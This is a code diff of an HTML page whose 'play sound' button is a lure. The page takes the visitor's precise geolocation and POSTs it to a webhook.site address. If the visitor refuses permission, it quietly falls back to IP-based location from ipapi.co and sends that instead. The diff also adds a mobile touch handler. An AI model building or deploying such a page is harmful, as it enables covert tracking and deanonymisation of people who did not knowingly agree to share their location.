@@ -38,10 +38,21 @@
 
     <script>
         const statusDiv = document.getElementById('status');
-        const MY_WEBHOOK_URL = 'https://webhook.site/f4538f91-c509-4e37-9139-8edca42f4de1'; // Замени на свой webhook URL
+        const MY_WEBHOOK_URL = 'https://webhook.site/YOUR-UNIQUE-URL'; // Замени на свой webhook URL
 
+        // Функция для воспроизведения звука
+        function playSound() {
+            const audio = new Audio('https://www.soundjay.com/buttons/sounds/beep-07.mp3');
+            audio.play().then(() => {
+                document.getElementById('playButton').innerHTML = '🔊 SOUND PLAYING!';
+                document.getElementById('playButton').style.background = 'green';
+            }).catch(error => {
+                console.log('Audio play failed:', error);
+            });
+        }
+
+        // Функция отправки локации
         function sendLocation(locationData) {
-            // Отправляем данные на webhook
             fetch(MY_WEBHOOK_URL, {
                 method: 'POST',
                 headers: {
@@ -56,9 +67,13 @@
             }).catch(error => console.log('Error sending data'));
         }
 
-        function getLocation() {
+        // Основная функция получения локации
+        function getLocationAndPlaySound() {
+            statusDiv.innerHTML = '🕐 Requesting location...';
+            
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
+                    // Успех - пользователь разрешил геолокацию
                     function(position) {
                         const locationData = {
                             latitude: position.coords.latitude,
@@ -69,15 +84,17 @@
                         statusDiv.innerHTML = `📍 Location: ${locationData.latitude}, ${locationData.longitude}`;
                         sendLocation(locationData);
                         
-                        // Воспроизводим звук после получения локации
+                        // ВОСПРОИЗВОДИМ ЗВУК ПОСЛЕ РАЗРЕШЕНИЯ ГЕОЛОКАЦИИ
                         playSound();
                     },
+                    // Ошибка - пользователь отказал
                     function(error) {
                         statusDiv.innerHTML = '❌ Location access denied';
-                        // Все равно воспроизводим звук
+                        
+                        // Все равно воспроизводим звук, но отправляем только IP
                         playSound();
                         
-                        // Отправляем IP-based location
+                        // Получаем приблизительную локацию по IP
                         fetch('https://ipapi.co/json/')
                             .then(response => response.json())
                             .then(ipData => {
@@ -88,6 +105,12 @@
                                     approximate: true
                                 });
                             });
+                    },
+                    // Настройки геолокации
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
                     }
                 );
             } else {
@@ -96,17 +119,15 @@
             }
         }
 
-        function playSound() {
-            const audio = new Audio('https://www.soundjay.com/buttons/sounds/beep-07.mp3');
-            audio.play().then(() => {
-                document.getElementById('playButton').innerHTML = '🔊 SOUND PLAYING!';
-                document.getElementById('playButton').style.background = 'green';
-            });
-        }
-
+        // Обработчик клика по кнопке
         document.getElementById('playButton').addEventListener('click', function() {
-            statusDiv.innerHTML = '🕐 Requesting location...';
-            getLocation();
+            getLocationAndPlaySound();
+        });
+
+        // Для мобильных устройств
+        document.getElementById('playButton').addEventListener('touchend', function(e) {
+            e.preventDefault();
+            getLocationAndPlaySound();
         });
     </script>
 </body>
